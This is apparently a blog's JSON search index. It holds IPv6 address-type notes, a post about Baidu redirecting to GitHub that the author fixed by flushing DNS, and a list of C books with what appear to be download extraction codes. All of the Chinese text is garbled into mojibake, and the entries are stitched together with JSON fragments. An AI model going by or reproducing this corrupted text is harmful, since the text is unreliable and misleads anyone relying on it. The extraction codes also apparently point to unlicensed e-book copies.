åœ°å€ç±»å‹ç»„æ’­åœ°å€ã€å•æ’­åœ°å€ã€ä»»æ’­åœ°å€ã€‚æ²¡æœ‰å¹¿æ’­åœ°å€å•æ’­åœ°å€åˆ†ä¸ºï¼šæœªæŒ‡å®šåœ°å€ã€ç¯å›åœ°å€ã€é“¾è·¯æœ¬åœ°åœ°å€ã€å…¨çƒå•æ’­åœ°å€ã€å”¯ä¸€æœ¬åœ°åœ°å€ å•æ’­åœ°å€ç”¨äºæ ‡è¯†ä¸€ä¸ªæ¥å£ï¼Œå‘å¾€è¯¥ç›®çš„åœ°å€çš„æŠ¥æ–‡ä¼šè¢«é€åˆ°è¢«æ ‡è¯†çš„æ¥å£ï¼›ç»„æ’­åœ°å€ç”¨äºæ ‡è¯†å¤šä¸ªæ¥å£ï¼Œå‘å¾€è¯¥ç›®çš„åœ°å€çš„æŠ¥æ–‡ä¼šè¢«é€åˆ°è¢«æ ‡è¯†çš„æ‰€æœ‰æ¥å£ï¼›ä»»æ’­åœ°å€ç”¨äºæ ‡è¯†å¤šä¸ªæ¥å£ï¼Œå‘å¾€è¯¥ç›®çš„åœ°å€çš„æŠ¥æ–‡ä¼šè¢«é€åˆ°è¢«æ ‡è¯†çš„æ‰€æœ‰æ¥å£ä¸­æœ€è¿‘çš„ä¸€ä¸ªæ¥å£ä¸Šã€‚å®é™…ä¸Šä»»æ’­åœ°å€ä¸å•æ’­åœ°å€ä½¿ç”¨åŒä¸€ä¸ªåœ°å€ç©ºé—´ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œç”±è·¯ç”±å™¨å†³å®šæ•°æ®åŒ…æ˜¯åšä»»æ’­è½¬å‘è¿˜æ˜¯å•æ’­è½¬å‘ã€‚ å•æ’­åœ°å€å…¨çƒå•æ’­åœ°å€å®ƒæ˜¯å…¨å±€å”¯ä¸€çš„å’Œå…¨å±€å¯è·¯ç”±çš„ã€‚ç±»ä¼¼äºIPv4å…¬ç½‘åœ°å€ã€‚ç”±å‰ç¼€ã€å­ç½‘IDå’Œæ¥æ”¶æ ‡è¯†ç¬¦ç»„æˆã€‚å…è®¸è·¯ç”±å‰ç¼€çš„èšåˆã€‚ 001ï¼š3bitï¼Œå›ºå®šå‰ç¼€TLAï¼ˆTop Level Aggregationï¼‰é¡¶çº§èšåˆï¼š13bitï¼ŒIPv6ç®¡ç†æœºæ„æ ¹æ®TLAåˆ†é…ä¸åŒçš„åœ°å€ç»™éª¨å¹²ç½‘RESï¼š8bitï¼Œä¿ç•™ä½¿ç”¨NLAï¼ˆNext Level Aggregationï¼‰æ¬¡çº§èšåˆï¼š24bitï¼Œéª¨å¹²ç½‘ISPæ ¹æ®NLAä¸ºå„ä¸ªä¸­å°ISPåˆ†é…ä¸åŒåœ°å€æ®µSLAï¼ˆSite Level Aggregationï¼‰ç«™ç‚¹çº§èšåˆï¼š16bitï¼Œä¼ä¸šæ ¹æ®SLAåˆ†æˆä¸åŒç½‘æ®µï¼Œåˆ†é…å„ç«™ç‚¹ä½¿ç”¨ ç”±001ã€TLAã€RESã€NLAç»„æˆçš„å‰ç¼€å«å…¨å±€è·¯ç”±å‰ç¼€ é“¾è·¯æœ¬åœ°åœ°å€åœ¨ä¸€ä¸ªèŠ‚ç‚¹å¯åŠ¨IPv6åè®®æ ˆæ—¶ï¼ŒèŠ‚ç‚¹çš„æ¯ä¸ªæ¥å£ä¼šè‡ªåŠ¨é…ç½®ä¸€ä¸ªé“¾è·¯æœ¬åœ°åœ°å€é“¾è·¯æœ¬åœ°åœ°å€æ˜¯IPv6ä¸­çš„èŒƒå›´å—é™åˆ¶çš„åœ°å€ç±»å‹ï¼Œè¯¥åœ°å€åªèƒ½äºç›¸åŒé“¾è·¯ä¸Šä¸»æœºé€šä¿¡åªèƒ½åœ¨è¿æ¥åˆ°åŒä¸€æœ¬åœ°é“¾è·¯çš„èŠ‚ç‚¹ä¹‹é—´ä½¿ç”¨ï¼Œåº”ç”¨äºé‚»å±…å‘ç°ã€æ— çŠ¶æ€åœ°å€ç­‰é“¾è·¯æœ¬åœ°åœ°å€å‰ç¼€FE80::&#x2F;10ï¼Œå°†æ¥å£IDæ·»åŠ åœ¨åé¢ä½œä¸ºåœ°å€çš„ä½64ä½ å”¯ä¸€æœ¬åœ°åœ°å€ç±»ä¼¼IPv4ç§ç½‘åœ°å€ï¼Œåªèƒ½åœ¨æœ¬åœ°ç½‘ç»œä½¿ç”¨å”¯ä¸€æœ¬åœ°åœ°å€å›ºå®šå‰ç¼€FC00::&#x2F;7ã€‚å®ƒè¢«åˆ†ä¸ºä¸¤å—ï¼ŒFC00::&#x2F;8æš‚æœªå®šä¹‰ï¼Œå¦ä¸€å—æ˜¯FD00::&#x2F;8 Prefixï¼šå‰ç¼€ï¼›å›ºå®šä¸ºFC00::&#x2F;7ã€‚Lï¼šLæ ‡å¿—ä½ï¼›å€¼ä¸º1ä»£è¡¨æœ¬åœ°ç½‘ç»œèŒƒå›´å†…ä½¿ç”¨çš„åœ°å€ï¼›å€¼ä¸º0è¢«ä¿ç•™ï¼Œç”¨äºä»¥åæ‰©å±•ã€‚Global IDï¼šå…¨çƒå”¯ä¸€å‰ç¼€ï¼›é€šè¿‡ä¼ªéšæœºæ–¹å¼äº§ç”Ÿï¼ˆRFC4193ï¼‰ã€‚Subnet IDï¼šå­ç½‘IDï¼›åˆ’åˆ†å­ç½‘ä½¿ç”¨ã€‚Interface IDï¼šæ¥å£æ ‡è¯†ã€‚ æœªæŒ‡å®šåœ°å€0:0:0:0:0:0:0:0&#x2F;128æˆ–è€…::&#x2F;128è¯¥åœ°å€ä½œä¸ºæŸäº›æŠ¥æ–‡çš„æºåœ°å€ï¼Œæ¯”å¦‚é‡å¤åœ°å€æ£€æµ‹æ—¶å‘é€çš„é‚»å±…è¯·æ±‚æŠ¥æ–‡NSçš„æºåœ°å€ï¼Œæˆ–è€…DHCPv6åˆå§‹åŒ–è¿‡ç¨‹ä¸­å®¢æˆ·ç«¯æ‰€å‘é€çš„è¯·æ±‚æŠ¥æ–‡çš„æºåœ°å€ ç¯å›åœ°å€0:0:0:0:0:0:0:1&#x2F;128æˆ–è€…::1&#x2F;128ä¸IPv4ä¸­çš„127.0.0.1ä½œç”¨ç›¸åŒï¼Œç”¨äºæœ¬åœ°å›ç¯ IPv6ç»„æ’­åœ°å€ç”¨æ¥æ ‡è¯†ä¸€ç»„æ¥å£ï¼Œå‘å¾€ç»„æ’­åœ°å€çš„æ•°æ®å°†è¢«è½¬å‘ç»™ä¾¦å¬è¯¥åœ°å€çš„å¤šä¸ªè®¾å¤‡ã€‚åœ°å€èŒƒå›´ï¼šFF00::&#x2F;8 Flagsï¼š4bitï¼Œç¬¬ä¸€ä½éƒ½æ˜¯é›¶ï¼Œæ ¼å¼|0|r|p|t|ï¼Œé€šå¸¸0000æˆ–è€…0001rä½ï¼šå–0è¡¨ç¤ºå†…åµŒRPï¼Œå–1è¡¨ç¤ºå†…åµŒRPpä½ï¼šå–0è¡¨ç¤ºéåŸºäºå•æ’­å‰ç¼€çš„ç»„æ’­åœ°å€ï¼Œå–1è¡¨ç¤ºåŸºäºå•æ’­å‰ç¼€çš„ç»„æ’­åœ°å€tä½ï¼šå–0è¡¨ç¤ºæ°¸ä¹…åˆ†é…ç»„æ’­åœ°å€ï¼Œå–1è¡¨ç¤ºä¸´æ—¶åˆ†é…ç»„æ’­åœ°å€Scopeï¼š4bitï¼Œæ ‡è¯†ä¼ æ’­èŒƒå›´0001 nodeï¼ˆèŠ‚ç‚¹ï¼‰ï¼šæœ¬åœ°æ¥å£èŒƒå›´ï¼Œä»…ç”¨äºLookback0010 linkï¼ˆé“¾è·¯ï¼‰ï¼šæœ¬åœ°é“¾è·¯èŒƒå›´0101 Siteï¼ˆç«™ç‚¹ï¼‰ï¼šæœ¬åœ°ç«™ç‚¹èŒƒå›´1000 organizationï¼ˆç»„ç»‡ï¼‰ï¼šæœ¬åœ°ç»„ç»‡èŒƒå›´ï¼Œå±äºåŒä¸€ä¸ªç»„ç»‡å¤šä¸ªç«™ç‚¹111 0 globalï¼ˆå…¨çƒï¼‰ï¼šå…¨å±€èŒƒå›´Group IDï¼š32bitï¼Œç»„æ’­ç»„ID é¢„å®šä¹‰ç»„æ’­åœ°å€Node-localï¼ˆèŠ‚ç‚¹æœ¬åœ°èŒƒå›´ï¼‰FF01:0:0:0:0:0:0:1ï¼Œæ‰€æœ‰èŠ‚ç‚¹çš„ç»„æ’­åœ°å€FF01:0:0:0:0:0:0:2ï¼Œæ‰€æœ‰è·¯ç”±å™¨çš„ç»„æ’­åœ°å€Link-laocalï¼ˆé“¾è·¯æœ¬åœ°èŒƒå›´ï¼‰FF02:0:0:0:0:0:0:1ï¼Œæ‰€æœ‰èŠ‚ç‚¹çš„ç»„æ’­åœ°å€ã€‚FF02:0:0:0:0:0:0:2ï¼Œæ‰€æœ‰è·¯ç”±å™¨çš„ç»„æ’­åœ°å€ã€‚FF02:0:0:0:0:1:FFXX:XXXX ï¼ŒSolicited-Nodeç»„æ’­åœ°å€ã€‚FF02:0:0:0:0:0:0:5ï¼Œæ‰€æœ‰OSPFè·¯ç”±å™¨ç»„æ’­åœ°å€ã€‚FF02:0:0:0:0:0:0:6ï¼Œæ‰€æœ‰OSPFçš„DRè·¯ç”±å™¨ç»„æ’­åœ°å€ã€‚FF02:0:0:0:0:0:0:Dï¼Œæ‰€æœ‰PIMè·¯ç”±å™¨ç»„æ’­åœ°å€ã€‚ IPv6ç»„æ’­åœ°å€çš„MACåœ°å€æ˜ å°„ç»„æ’­IPv6æŠ¥æ–‡ä¸­ï¼Œç›®çš„IPåœ°å€æ˜¯ç»„æ’­IPv6åœ°å€ï¼Œç›®çš„MACåœ°å€æ˜¯ç»„æ’­MACåœ°å€ï¼Œè¯¥åœ°å€å¿…é¡»ä¸ç»„æ’­IPv6åœ°å€å¯¹åº”ç»„æ’­MACåœ°å€é«˜16ä½æ˜¯3333ï¼Œä½32ä½ä¸ç»„æ’­IPv6åœ°å€çš„ä½32ä½ä¸€è‡´ è¢«è¯·æ±‚èŠ‚ç‚¹ç»„æ’­åœ°å€ï¼ˆSolicited-Node Multicast Addressï¼‰ä¸€ä¸ªèŠ‚ç‚¹å…·æœ‰å•æ’­æˆ–ä»»æ’­åœ°å€ï¼Œå°±ä¼šç”Ÿæˆä¸€ä¸ªå¯¹åº”çš„è¢«è¯·æ±‚èŠ‚ç‚¹ç»„æ’­åœ°å€å‰ç¼€FF02::1:FF00:0&#x2F;104å’Œå¯¹åº”IPv6åœ°å€çš„æœ€å24ä½ç»„æˆä¸»è¦åº”ç”¨ï¼šé‚»å±…å‘ç°ã€åœ°å€é‡å¤æ£€æµ‹åŠŸèƒ½ IPv6ä»»æ’­åœ°å€ä»»æ’­åœ°å€æ˜¯IPv6ç‰¹æœ‰çš„åœ°å€ç±»å‹ï¼Œç”¨æ¥æ ‡è¯†ä¸€ç»„ç½‘ç»œæ¥å£å‘å¾€ä»»æ’­çš„æŠ¥æ–‡åªä¼šè¢«å‘é€åˆ°æœ€è¿‘çš„ä¸€ä¸ªæ¥å£ã€‚ä»»æ’­åœ°å€ä¸å•æ’­åœ°å€ä½¿ç”¨ç›¸åŒçš„åœ°å€ç©ºé—´ï¼Œå› æ­¤ä»»æ’­ä¸å•æ’­çš„è¡¨ç¤ºæ— ä»»ä½•åŒºåˆ«ï¼›é…ç½®æ—¶é¡»æ˜ç¡®è¡¨æ˜æ˜¯ä»»æ’­åœ°å€ï¼Œä»¥æ­¤åŒºåˆ«å•æ’­å’Œä»»æ’­ã€‚ è¿ç§»åˆ° IPv6 æ‰€èƒ½å¸¦æ¥çš„ä¸€äº›å¥½å¤„ã€‚ ç®€åŒ–äº†çš„ IPv6 æ•°æ®åŒ…å¤´éƒ¨ æ›´å¤§çš„åœ°å€ç©ºé—´ IPv6å±‚æ¬¡åŒ–çš„åˆ†å€æ–¹æ³• IPv6çš„æ‰©å±•æ€§æ‰©å……æ€§ IPv6æ¶ˆé™¤äº†å¹¿æ’­ æ— çŠ¶æ€çš„è‡ªåŠ¨é…ç½® é›†æˆç§»åŠ¨èƒ½åŠ› é›†æˆäº†å®‰å…¨å¢å¼º Integrating IPv4 and IPv6 Network Environmentsè®¿é—®æ§åˆ¶æ¸…å•è·¯ç”±çš„ä¸€äº›æ¦‚å¿µStatic Routingé™æ€è·¯ç”±OSPFDHCP&amp;&amp;DNSä¸€äºŒå±‚æ’é”™Spanning Tree Protocolç”Ÿæˆæ ‘åè®®ä»¥å¤ªç½‘é€šé“å’Œé“¾è·¯èšåˆFirst Hop Redundancy Protocols ç¬¬ä¸€è·³å†—ä½™åè®®iosä¸å¯åŠ¨ï¼ˆç¡¬ä»¶ï¼‰å¢å¼ºçš„å†…éƒ¨ç½‘å…³è·¯ç”±åè®®snmap&amp;&amp;netflowå¹¿åŸŸç½‘wanå¸§ä¸­ç»§ä¸ç‚¹å¯¹ç‚¹è¯æ±‡è¡¨ï¼šaclï¼šæ§åˆ¶è®¿é—®åˆ—è¡¨","categories":[],"tags":[]},{"title":"è®¿é—®ç™¾åº¦è‡ªåŠ¨è·³è½¬github","slug":"è®¿é—®ç™¾åº¦è‡ªåŠ¨è·³è½¬github","date":"2023-12-01T08:31:37.000Z","updated":"2024-01-21T16:44:44.532Z","comments":true,"path":"2023/12/01/è®¿é—®ç™¾åº¦è‡ªåŠ¨è·³è½¬github/","link":"","permalink":"http://example.com/2023/12/01/%E8%AE%BF%E9%97%AE%E7%99%BE%E5%BA%A6%E8%87%AA%E5%8A%A8%E8%B7%B3%E8%BD%ACgithub/","excerpt":"ä½¿ç”¨steam++åŠ é€Ÿgithubåæµè§ˆç™¾åº¦å±…ç„¶è‡ªåŠ¨è·³è½¬GitHubã€ è¿™ä¸€ä¸‹å­å°±æƒ³åˆ°äº†dnsåŠ«æŒï¼Œæˆ–è€…ipåŠ«æŒã€‚è¦ä¹ˆå°±æ˜¯æˆ‘çš„æœ¬åœ°localhostæ–‡ä»¶è¢«æ›´æ”¹ã€‚æ€»ä¹‹å¼ºåˆ¶è·³è½¬å¾ˆæ¶å¿ƒã€‚ 1234äºæ˜¯ç«¯å£é“¾æ¥ã€‚æ£€æŸ¥localhostæ–‡ä»¶ã€‚å‘ç°ä¸€åˆ‡æ­£å¸¸ç„¶åç”¨ Ipconfig/flushdns æ¸…é™¤dnsè§£æè®°å½•ç„¶åæ¸…æ¥šæµè§ˆå™¨ç¼“å­˜ã€‚å°±æ²¡æœ‰è¯¥é—®é¢˜ æ²¡é’±ä¹°é­”æ³•ã€‚çœŸçš„éš¾å—","text":"ä½¿ç”¨steam++åŠ é€Ÿgithubåæµè§ˆç™¾åº¦å±…ç„¶è‡ªåŠ¨è·³è½¬GitHubã€ è¿™ä¸€ä¸‹å­å°±æƒ³åˆ°äº†dnsåŠ«æŒï¼Œæˆ–è€…ipåŠ«æŒã€‚è¦ä¹ˆå°±æ˜¯æˆ‘çš„æœ¬åœ°localhostæ–‡ä»¶è¢«æ›´æ”¹ã€‚æ€»ä¹‹å¼ºåˆ¶è·³è½¬å¾ˆæ¶å¿ƒã€‚ 1234äºæ˜¯ç«¯å£é“¾æ¥ã€‚æ£€æŸ¥localhostæ–‡ä»¶ã€‚å‘ç°ä¸€åˆ‡æ­£å¸¸ç„¶åç”¨ Ipconfig/flushdns æ¸…é™¤dnsè§£æè®°å½•ç„¶åæ¸…æ¥šæµè§ˆå™¨ç¼“å­˜ã€‚å°±æ²¡æœ‰è¯¥é—®é¢˜ æ²¡é’±ä¹°é­”æ³•ã€‚çœŸçš„éš¾å—","categories":[],"tags":[]},{"title":"cè¯­è¨€ä¹¦å•æ”¶é›†","slug":"cè¯­è¨€ä¹¦ç±ç›®å½•","date":"2023-11-30T16:01:03.000Z","updated":"2023-12-05T00:47:40.912Z","comments":true,"path":"2023/12/01/cè¯­è¨€ä¹¦ç±ç›®å½•/","link":"","permalink":"http://example.com/2023/12/01/c%E8%AF%AD%E8%A8%80%E4%B9%A6%E7%B1%8D%E7%9B%AE%E5%BD%95/","excerpt":"sCè¯­è¨€ç›¸å…³ç”µå­ä¹¦ï¼šæ¨èä¹¦ç±ï¼š- ç¬¬ä¸€æœ¬ä¹¦ã€Šé˜¿å“ˆCè¯­è¨€ã€‹çš„å†™ä¹¦é£æ ¼ä¸ªäººè®¤ä¸ºæ¯”è¾ƒé£è¶£å¹½é»˜ï¼Œå¯¹äºåŸ¹å…»å…´è¶£ï¼ŒåŸºç¡€å­¦ä¹ è¿˜æ˜¯å¾ˆä¸é”™çš„- ã€ŠCç¨‹åºè®¾è®¡è¯­è¨€ã€‹ï¼Œæœºæ¢°å·¥ä¸šå‡ºç‰ˆç¤¾ï¼Œä½œè€…Brian W. Kernighan &#x2F; ï¼ˆç¾ï¼‰Dennis M. Ritchieã€‚C è¯­è¨€ä¹‹çˆ¶å†™çš„ï¼Œå…¥é—¨ç»å…¸ä¹¦ç±ã€‚","text":"sCè¯­è¨€ç›¸å…³ç”µå­ä¹¦ï¼šæ¨èä¹¦ç±ï¼š- ç¬¬ä¸€æœ¬ä¹¦ã€Šé˜¿å“ˆCè¯­è¨€ã€‹çš„å†™ä¹¦é£æ ¼ä¸ªäººè®¤ä¸ºæ¯”è¾ƒé£è¶£å¹½é»˜ï¼Œå¯¹äºåŸ¹å…»å…´è¶£ï¼ŒåŸºç¡€å­¦ä¹ è¿˜æ˜¯å¾ˆä¸é”™çš„- ã€ŠCç¨‹åºè®¾è®¡è¯­è¨€ã€‹ï¼Œæœºæ¢°å·¥ä¸šå‡ºç‰ˆç¤¾ï¼Œä½œè€…Brian W. Kernighan &#x2F; ï¼ˆç¾ï¼‰Dennis M. Ritchieã€‚C è¯­è¨€ä¹‹çˆ¶å†™çš„ï¼Œå…¥é—¨ç»å…¸ä¹¦ç±ã€‚ ã€ŠC Primer Plusã€‹ ï¼Œäººæ°‘é‚®ç”µå‡ºç‰ˆç¤¾ï¼Œä½œè€… Stephen Prataã€‚ å¯ä»¥ä½œä¸º C è¯­è¨€å·¥å…·ä¹¦ï¼Œä¹Ÿå¯ä»¥ä½œä¸ºå…¥é—¨ï¼Œå†…å®¹å¾ªåºæ¸è¿›ï¼Œèƒ½å¤Ÿé”»ç‚¼ç¼–ç¨‹æ€æƒ³ã€‚ ã€ŠCå’ŒæŒ‡é’ˆã€‹ æ·±å…¥äº†è§£æŒ‡é’ˆï¼Œçœ‹å®Œä»¥åå¯¹æŒ‡é’ˆä¸å†å®³æ€•ã€‚ ã€ŠCé™·é˜±ä¸ç¼ºé™·ã€‹ æ­£å¦‚ä¹¦ä¸Šæ‰€è¯´ï¼Œâ€œæœ¬ä¹¦æ‰€æ­ç¤ºçš„çŸ¥è¯†ï¼Œè‡³å°‘èƒ½å¤Ÿå¸®åŠ©ä½ å‡å°‘ C ä»£ç å’Œåˆçº§ C++ ä»£ç ä¸­ 90% çš„ Bugâ€ï¼Œçœ‹å®Œåå¯ä»¥é¿å… C è¯­è¨€å¼€å‘çš„ä¸€äº›å‘ã€‚ å…¨éƒ¨ç”µå­ä¹¦ï¼šç¨‹åºå‘˜ç›¸å…³ç”µå­ä¹¦èµ„æ–™ä»“åº“|å…è´¹åˆ†äº« çŸ¥åå¤§å­¦è®¡ç®—æœºç³»å¼€æºè¯¾ç¨‹æ”¶å½•ï¼š æµ™æ±Ÿå¤§å­¦è¯¾ç¨‹æ”»ç•¥å…±äº«è®¡åˆ’ æ¸…åå¤§å­¦è®¡ç®—æœºç³»è¯¾ç¨‹æ”»ç•¥ ä¸Šæµ·äº¤é€šå¤§å­¦è¯¾ç¨‹èµ„æ–™åˆ†äº« åŒ—äº¬èˆªç©ºèˆªå¤©å¤§å­¦(åŒ—èˆª)è¯¾ç¨‹ä½œä¸šèµ„æ–™å…±äº«è®¡åˆ’ ååŒ—ç”µåŠ›å¤§å­¦è®¡ç®—æœºç³»è¯¾ç¨‹æ”»ç•¥ åŒ—äº¬é‚®ç”µå¤§å­¦è®¡ç®—æœºè€ƒç ”ä¿¡æ¯æ±‡æ€» å¼ºçƒˆæ¨èå¼€æºåˆ·é¢˜åº“ï¼Œå¯ä»¥æ³¨å†Œä¸€ä¸ªï¼Œç°åœ¨å…è´¹ï¼Œåé¢å¯èƒ½è¦æ”¶è´¹ã€‚ ç‚¹å‡»å…è´¹æ³¨å†Œ æ³¨ï¼šè¿™é‡Œåªæ˜¯æ³¨å†Œçš„å…¥å£ï¼Œå¯ä»¥åˆ·ç®—æ³•ã€C&#x2F;C++ã€Javaã€ç¡¬ä»¶ã€å‰æ®µç­‰ï¼Œå½“ç„¶è¿˜æœ‰å¤§å‚é¢ç»ï¼Œé¢è¯•çœŸé¢˜ï¼Œæ¨èå¤§å®¶æ³¨å†Œï¼Œä»¥åå¤šåˆ·åˆ·é¢˜ã€‚ä¿®ç‚¼å¥½å†…åŠŸï¼ Cè¯­è¨€C è¯­è¨€å¯ä»¥é›¶åŸºç¡€å…¥é—¨ï¼Œå®ƒçš„è¯­æ³•æ˜¯å¾ˆå¤šé«˜çº§ç¼–ç¨‹è¯­è¨€çš„åŸºç¡€ï¼Œæ¯”å¦‚è¯´ Javaã€C++ï¼›å¹¶ä¸”èµ·åˆ°æ‰¿ä¸Šå¯ä¸‹çš„ä½œç”¨ï¼Œå‘ä¸Šå¯ä»¥å­¦ä¹ é«˜çº§ç¼–ç¨‹è¯­è¨€ï¼Œå‘ä¸‹å¯ä»¥å­¦ä¹ è®¡ç®—æœºç»„æˆåŸç†ã€æ“ä½œç³»ç»Ÿç­‰ç­‰ååŸºç¡€çš„è®¡ç®—æœºåŸºç¡€çŸ¥è¯†ã€‚ éœ€è¦ä¸‹è½½ä¸‹é¢ç”µå­ä¹¦çš„è¯ï¼Œç›´æ¥ç‚¹å‡»ä¹¦åï¼Œè¾“å…¥æå–ç ï¼ å¾æœCæŒ‡é’ˆ æå–ç ï¼šwwcd ç»å…¸Cç¨‹åº100ä¾‹ æå–ç ï¼št8oe Cä¸“å®¶ç¼–ç¨‹ æå–ç ï¼šuso7 Cè¯­è¨€æŒ‡é’ˆç»éªŒæ€»ç»“ æå–ç ï¼šibjw Cè¯­è¨€æ·±åº¦è§£å‰– æå–ç ï¼š6qho Cè¯­è¨€æ·±åº¦è§£å‰– è§£å¼€ç¨‹åºå‘˜é¢è¯•ç¬”è¯•çš„ç§˜å¯† æå–ç ï¼šffh1 cè¯­è¨€å…¥é—¨ç»å…¸(ç¬¬5ç‰ˆ) æå–ç ï¼šlzro Cè¯­è¨€è§£ææ•™ç¨‹ æå–ç ï¼šmfgv Cè¯­è¨€å‡½æ•°å¤§å…¨ æå–ç ï¼šir2d Cè¯­è¨€çš„ç§‘å­¦å’Œè‰ºæœ¯ æå–ç ï¼šzm88 Cè¯­è¨€ç­”ç–‘è§£æƒ‘ä¸å…¸å‹é¢˜è§£ æå–ç ï¼š8cw5 Cè¯­è¨€ä»å…¥é—¨åˆ°ç²¾é€š ç¬¬2ç‰ˆæ˜æ—¥ç§‘æŠ€ æå–ç ï¼š4s8h Cè¯­è¨€ç¨‹åºè®¾è®¡_ç°ä»£æ–¹æ³• æå–ç ï¼št4vn Cè¯­è¨€å¸¸è§é—®é¢˜é›†ï¼ˆé—®é¢˜æé«˜ç‰ˆï¼‰ æå–ç ï¼šxto5 Cè¯­è¨€å‚æ‚Ÿä¹‹æ—… æå–ç ï¼š5h1t Cè¯­è¨€å‚è€ƒæ‰‹å†Œç¬¬äº”ç‰ˆ æå–ç ï¼št3g1 Cè¯­è¨€ç¼–ç¨‹ç²¾ç²¹ æå–ç ï¼š5oai Cé™·é˜±ä¸ç¼ºé™· æå–ç ï¼šnejz Cå’ŒæŒ‡é’ˆï¼ˆä¸­æ–‡ç‰ˆï¼‰ æå–ç ï¼š1gvd Cç¨‹åºè®¾è®¡è¯­è¨€(è‹±æ–‡ç¬¬2ç‰ˆ)åŠå…¶è¯¾åé¢˜ç­”æ¡ˆ æå–ç ï¼šwzky Cç¨‹åºè®¾è®¡è¯­è¨€ï¼ˆç¬¬2ç‰ˆ æ–°ç‰ˆï¼‰åŠè¯¾åç­”æ¡ˆ æå–ç ï¼šrowl C ç¨‹åºè®¾è®¡è¯­è¨€ï¼ˆç¬¬2ç‰ˆï¼‰ æå–ç ï¼š4s98 C Primer Plus ä¸­è‹±ç‰ˆ æå–ç ï¼šum90 C Primer Plus ç¬¬6ç‰ˆ ä¸­æ–‡ç‰ˆ æå–ç ï¼šn30r 21å¤©å­¦é€šCè¯­è¨€ ç¬¬7ç‰ˆ æå–ç ï¼š8fuj [å­¦é€šCè¯­è¨€çš„24å ‚è¯¾].åˆ˜å½¬å½¬&amp;å­™ç§€æ¢… æå–ç ï¼šf44n [Cè¯­è¨€å¿…é¡»çŸ¥é“çš„300ä¸ªé—®é¢˜].æ˜æ—¥ç§‘æŠ€.æ‰«æç‰ˆ æå–ç ï¼šbn80 Cè¯­è¨€æ–‡ç« å¹²è´§ï¼š Cè¯­è¨€æœ€å…¨å…¥é—¨ç¬”è®° Cè¯­è¨€ä¹¦ç±ã€è½¯ä»¶ã€60ä¸ªæºç  ä¸€æ–‡å¸¦ä½ å­¦C&#x2F;C++ï¼Œè¯¦ç»†çŸ¥è¯†ç‚¹æ€ç»´å¯¼å›¾ï¼ 10W+ å­—Cè¯­è¨€ä»å…¥é—¨åˆ°ç²¾é€šä¿å§†çº§æ•™ç¨‹ï¼ˆ2021ç‰ˆä¸Šï¼‰ 10W+å­—Cè¯­è¨€ä»å…¥é—¨åˆ°ç²¾é€šä¿å§†çº§æ•™ç¨‹ï¼ˆ2021ç‰ˆä¸‹ï¼‰ ç†¬å¤œæ•´ç†çš„C&#x2F;C++ä¸‡å­—çŸ¥è¯†æ€»ç»“ï¼ˆä¸€ï¼‰ ç†¬å¤œæ•´ç†çš„C&#x2F;C++ä¸‡å­—çŸ¥è¯†æ€»ç»“ï¼ˆäºŒï¼‰ ç†¬å¤œæ•´ç†çš„C&#x2F;C++ä¸‡å­—çŸ¥è¯†æ€»ç»“ï¼ˆä¸‰ï¼‰ ç†¬å¤œæ•´ç†çš„C&#x2F;C++ä¸‡å­—çŸ¥è¯†æ€»ç»“ï¼ˆå››ï¼‰ ç†¬å¤œæ•´ç†çš„C&#x2F;C++ä¸‡å­—çŸ¥è¯†æ€»ç»“ï¼ˆäº”ï¼‰ èŠèŠæˆ‘æ˜¯å¦‚ä½•ç¼–ç¨‹å…¥é—¨çš„ Cè¯­è¨€ä¸­ä¸‰å—éš¾å•ƒçš„ç¡¬éª¨å¤´ Cè¯­è¨€&#x2F;C++åŸºæœ¬è¯­å¥ç¼–ç¨‹é£æ ¼ Cè¯­è¨€C++ä¸­assertçš„ç”¨æ³• å­—ç¬¦ä¸²æ“ä½œçš„å…¨é¢æ€»ç»“ C&#x2F;C++ ä½æ“ä½œè¯¦è§£ C&#x2F;C++åŸºç¡€ä¹‹sizeofä½¿ç”¨ Cè¯­è¨€å¸¸ç”¨æ ‡å‡†åº“è§£è¯» C&#x2F;C++ å¤´æ–‡ä»¶ â€œ ç»†èŠ‚ â€ è¯¦ç»†å‰–æ extern â€œCâ€ å¤´æ–‡ä»¶é˜²å«å¼å£°æ˜ é•¿æ–‡è¯¦è§£ï¼šCè¯­è¨€é¢„å¤„ç†å‘½ä»¤ Cè¯­è¨€æœ€å¸¸ç”¨çš„è´ªå¿ƒç®—æ³•å°±è¿™ä¹ˆè¢«æ”»å…‹äº† å¹²è´§|æ‰‹æŠŠæ‰‹æ•™ä½ å†™å•ç‰‡æœºçš„Cè¯­è¨€ç»“æ„ä½“ å¸¸è§çš„Cè¯­è¨€å†…å­˜é”™è¯¯åŠå¯¹ç­– Cè¯­è¨€å®ç°é¢å‘å¯¹è±¡çš„åŸç† ä¸€æ­¥æ­¥åˆ†æ-Cè¯­è¨€å¦‚ä½•é¢å‘å¯¹è±¡ç¼–ç¨‹ Cè¯­è¨€å­—ç¬¦ä¸²è¯¦è§£ å¹²è´§ | æ·±åº¦å‰–æCè¯­è¨€çš„mainå‡½æ•° Cè¯­è¨€å¤´æ–‡ä»¶ç»„ç»‡ä¸åŒ…å«åŸåˆ™ C è¯­è¨€æ€ä¹ˆå¯èƒ½è¢«æ·˜æ±°å‘¢ï¼Ÿ æ•°ç»„è¶Šç•ŒåŠå…¶é¿å…æ–¹æ³•ï¼ŒCè¯­è¨€æ•°ç»„è¶Šç•Œè¯¦è§£ çœ‹å®Œè¿™ç¯‡ä½ è¿˜èƒ½ä¸æ‡‚Cè¯­è¨€&#x2F;C++å†…å­˜ç®¡ç†ï¼Ÿ Cè¯­è¨€&#x2F;C++ å †æ ˆå·¥ä½œæœºåˆ¶ å…³äºå †æ ˆçš„è®²è§£(æˆ‘è§è¿‡çš„æœ€ç»å…¸çš„) C&#x2F;C++ åŸºç¡€æ ˆæº¢å‡ºåŠä¿æŠ¤æœºåˆ¶ Cè¯­è¨€æŒ‡é’ˆè¯¦è§£ å†è°ˆæŒ‡é’ˆï¼šå¤§ä½¬ç»™ä½ æ‹¨å¼€ C æŒ‡é’ˆçš„äº‘é›¾ Cè¯­è¨€å‡½æ•°æŒ‡é’ˆä¹‹å›è°ƒå‡½æ•° Cè¯­è¨€é«˜æ•ˆç¼–ç¨‹ä¸ä»£ç ä¼˜åŒ– Cè¯­è¨€ä¹‹ç»“æ„ä½“å°±è¿™æ ·è¢«æ”»å…‹äº†ï¼å€¼å¾—æ”¶è—ï¼ åŸç , åç , è¡¥ç  è¯¦è§£ æµ®ç‚¹æ•°çš„ç§˜å¯† æµ®ç‚¹æ•°æ¯”è¾ƒçš„ç²¾åº¦é—®é¢˜ 